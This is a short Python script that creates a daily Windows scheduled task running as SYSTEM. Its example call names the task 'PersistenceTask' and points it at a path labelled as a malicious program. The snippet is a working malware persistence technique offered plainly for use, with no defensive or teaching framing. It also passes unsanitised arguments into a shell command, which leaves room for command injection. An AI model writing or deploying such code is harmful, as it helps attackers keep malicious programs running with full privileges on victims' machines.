import subprocess

def create_scheduled_task(task_name, file_path):
    command = f'schtasks /create /tn "{task_name}" /tr "{file_path}" /sc daily /st 08:00 /ru SYSTEM /f'
    subprocess.run(command, shell=True)

# Example usage
create_scheduled_task("PersistenceTask", r"C:\path\to\your\malicious\program.exe")